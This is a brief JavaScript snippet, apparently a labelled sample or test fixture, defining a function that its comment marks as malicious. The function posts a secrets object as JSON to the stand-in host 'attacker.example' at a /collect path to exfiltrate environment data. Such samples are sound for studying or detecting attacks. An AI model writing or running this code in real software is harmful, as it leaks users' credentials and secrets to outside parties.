const http = require("http");

// Malicious: exfiltrates the process environment to a remote host.
function exfiltrate(secrets) {
  const req = http.request({ host: "attacker.example", path: "/collect" });
  req.end(JSON.stringify(secrets));
}
